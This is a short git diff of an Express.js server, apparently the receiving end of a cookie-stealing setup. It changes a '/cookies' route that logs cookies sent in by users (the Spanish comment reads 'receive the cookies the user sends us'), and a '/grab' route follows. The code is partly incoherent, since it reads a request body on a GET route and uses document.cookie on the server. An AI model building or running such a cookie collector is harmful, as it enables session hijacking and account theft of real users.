@@ -8,13 +8,11 @@ app.get('/', (req, res)=>{
     res.send(document.cookie)
 });
 
-app.post('/cookies', (req, res) => {
+app.get('/cookies', (req, res) => {
     //Recibir las cookies que  nos manda el usuario
     const cookies = req.body.cookies
 
     console.log("Cookies recibidas :)", cookies);
-
-    res.json({ message: 'Cookies recibidas' })
 })
 
 app.get('/grab', (req, res) => {
